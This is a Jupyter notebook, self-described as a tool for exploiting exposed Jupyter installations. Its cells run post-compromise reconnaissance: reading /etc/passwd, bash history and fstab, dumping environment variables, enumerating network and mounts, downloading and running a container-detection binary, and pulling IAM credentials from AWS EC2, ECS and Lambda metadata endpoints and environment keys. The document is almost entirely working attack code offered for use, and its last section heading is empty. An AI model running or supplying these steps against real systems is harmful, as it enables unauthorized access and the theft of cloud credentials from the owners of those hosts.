{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "294814dc-1e40-4c58-8712-d948e9ae3e83",
   "metadata": {},
   "source": [
    "# Jupyter Breakouts\n",
    "\n",
    "This notebook is designed to support exploitation of exposed jupyter installations by providing features for reconnaissance and information gathering, along with code execution on the underlying host."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "36242c6b-3a1f-4c5a-8eb0-d7aee66cd321",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os, json, sys, subprocess"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fc79da40-6876-483f-92a1-7a827c8a6c56",
   "metadata": {},
   "source": [
    "# System Details"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e3da5282-fcde-4b23-b6a6-ee5d6c3fe565",
   "metadata": {},
   "outputs": [],
   "source": [
    "with open(\"/proc/version\", \"r\") as printfile:\n",
    "    print(printfile.read())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1474989b-28e0-4f3c-b90b-e637d7151d71",
   "metadata": {},
   "outputs": [],
   "source": [
    "with open(\"/etc/passwd\", \"r\") as printfile:\n",
    "    print(printfile.read())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "adea20c1-794b-46dd-be27-0985d568a63b",
   "metadata": {},
   "source": [
    "# Environment Details"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ecfedc6e-d865-446c-8631-be3b39564903",
   "metadata": {
    "collapsed": true,
    "jupyter": {
     "outputs_hidden": true
    },
    "tags": []
   },
   "outputs": [],
   "source": [
    "os.environ"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7c1e6087-61b5-4e52-8efd-446b118bf62a",
   "metadata": {},
   "source": [
    "# User Details"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "721fd3f9-1b6b-4f5b-bbd2-8ea91f10acd8",
   "metadata": {},
   "outputs": [],
   "source": [
    "print(os.getlogin())\n",
    "print(os.geteuid())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "55687977-b5f6-4e1a-ab52-fc926fee2ac3",
   "metadata": {},
   "outputs": [],
   "source": [
    "with open(\"~/.bash_history\", \"r\") as printfile:\n",
    "    print(printfile.read())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2e2d6cb9-046d-403c-b8a1-ff969d6b6b79",
   "metadata": {},
   "source": [
    "# Filesystem"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ecb98abc-3039-4687-b70c-a03ff286f783",
   "metadata": {},
   "outputs": [],
   "source": [
    "os.system(\"mount\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6a0622b2-6336-4218-80f3-afae83e6d092",
   "metadata": {},
   "outputs": [],
   "source": [
    "with open(\"/etc/fstab\", \"r\") as printfile:\n",
    "    print(printfile.read())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "10dab887-2e8d-43ad-9085-f41c8686aba2",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "id": "bc68ee40-f041-4fa9-9390-285d35fb9177",
   "metadata": {},
   "source": [
    "# Network Info"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cb0c1aa5-95bc-4709-8dec-cd753f14873c",
   "metadata": {},
   "outputs": [],
   "source": [
    "os.system(\"ss -antup | grep -v 'ESTAB'\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "18663a0c-1fdb-43d4-92ad-b7ff17a5429d",
   "metadata": {},
   "outputs": [],
   "source": [
    "os.system(\"ip addr\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5932cee2-f7f3-4de4-82a6-4a1694cdd33a",
   "metadata": {},
   "outputs": [],
   "source": [
    "os.system(\"ip r\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "73ec1928-7bcd-423d-8b58-156c2acdd071",
   "metadata": {},
   "source": [
    "# Container Enumeration"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e95f7aa7-6139-492f-b99d-8f30d8dc5652",
   "metadata": {},
   "outputs": [],
   "source": [
    "os.system('curl -fSL \"https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64\" -o \"/tmp/amicontained\" && chmod a+x \"/tmp/amicontained\"')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ce09a0c5-e3c5-4931-99eb-9fb24d86712a",
   "metadata": {},
   "outputs": [],
   "source": [
    "os.system(\"/tmp/amicontained\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b94efade",
   "metadata": {},
   "source": [
    "## Cloud IMDS Endpoints\n",
    "\n",
    "### EC2 IMDS v1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "36b1355a-c165-4036-939e-46b2ecff7622",
   "metadata": {},
   "outputs": [],
   "source": [
    "result = subprocess.run('curl -v http://169.254.169.254/latest/meta-data/iam/security-credentials', capture_output=True)\n",
    "print(result.stderr.decode())\n",
    "print(result.stdout.decode())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8d9a7207",
   "metadata": {},
   "source": [
    "### EC2 IMDS v2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d3e11433",
   "metadata": {},
   "outputs": [],
   "source": [
    "result = subprocess.run('TOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\"` && curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME -H \"X-aws-ec2-metadata-token: $TOKEN\"', shell=True, capture_output=True)\n",
    "print(result.stderr.decode())\n",
    "print(result.stdout.decode())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "23286349",
   "metadata": {},
   "source": [
    "### Lambda - Environment Variables"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9804e386",
   "metadata": {},
   "outputs": [],
   "source": [
    "result1 = subprocess.run(\"echo $AWS_ACCESS_KEY_ID\", shell=True, capture_output=True)\n",
    "print(result1.stdout.decode())\n",
    "result2 = subprocess.run(\"echo $AWS_SECRET_ACCESS_KEY\", shell=True, capture_output=True)\n",
    "print(result2.stdout.decode())\n",
    "result3 = subprocess.run(\"echo $AWS_SESSION_TOKEN\", shell=True, capture_output=True)\n",
    "print(result3.stdout.decode())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4b392a6d",
   "metadata": {},
   "source": [
    "### ECS IMDS"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ee69e894",
   "metadata": {},
   "outputs": [],
   "source": [
    "result = subprocess.run('curl -v 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI', capture_output=True)\n",
    "print(result.stderr.decode())\n",
    "print(result.stdout.decode())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3c039cd0",
   "metadata": {},
   "source": [
    "### EKS Web Identity"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
